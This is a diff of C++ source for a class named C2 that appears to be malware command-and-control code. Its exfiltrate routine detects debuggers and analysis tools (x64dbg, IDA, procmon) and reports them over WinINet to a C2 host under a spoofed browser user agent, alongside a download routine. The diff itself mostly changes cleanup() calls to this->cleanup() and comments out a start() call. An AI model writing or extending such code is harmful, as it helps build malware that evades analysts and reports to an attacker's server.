@@ -11,7 +11,7 @@
 
 void C2::execute() {
 	this->download();
-	this->start();
+	//this->start();
 	this->exfiltrate();
 }
 
@@ -19,7 +19,7 @@ void C2::exfiltrate() {
 	this->ph.detectProcesses();
 	string pathName = "exfiltrate?x64dbg=" + this->boolToString(this->ph.isx64dbg) + "&x32dbg=" + this->boolToString(this->ph.isx32dbg) + "&ida=" + this->boolToString(this->ph.isida64) + "&procmon=" + this->boolToString(this->ph.isProc32);;
 	netsend(this->util.getC2Host(), pathName.c_str());
-	cleanup();
+	this->cleanup();
 }
 
 string C2::boolToString(bool b) {
@@ -47,7 +47,7 @@ void C2::download() {
 
 	ostream.flush();
 	ostream.close();
-	cleanup();
+	this->cleanup();
 }
 
 void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
@@ -55,14 +55,14 @@ void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
 
 	this->error = InternetAttemptConnect(0);
 	if (error != ERROR_SUCCESS) {
-		cleanup();
+		this->cleanup();
 		return;
 	}
 	this->sessionHandle = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 
 	if (sessionHandle == NULL) {
 		this->error = GetLastError();
-		cleanup();
+		this->cleanup();
 		return;
 	}
 
@@ -70,14 +70,14 @@ void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
 
 	if (this->connectHandle == NULL) {
 		this->error = GetLastError();
-		cleanup();
+		this->cleanup();
 		return;
 	}
 	this->requestHandle = HttpOpenRequest(this->connectHandle, "GET", pathName, NULL, NULL, NULL, INTERNET_FLAG_NO_UI, NULL);
 
 	if (this->requestHandle == NULL) {
 		this->error = GetLastError();
-		cleanup();
+		this->cleanup();
 		return;
 	}
 
@@ -85,7 +85,7 @@ void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
 	BOOL sent = HttpSendRequest(this->requestHandle, NULL, 0, NULL, 0);
 	if (!sent) {
 		this->error = GetLastError();
-		cleanup();
+		this->cleanup();
 		return;
 	}
 }
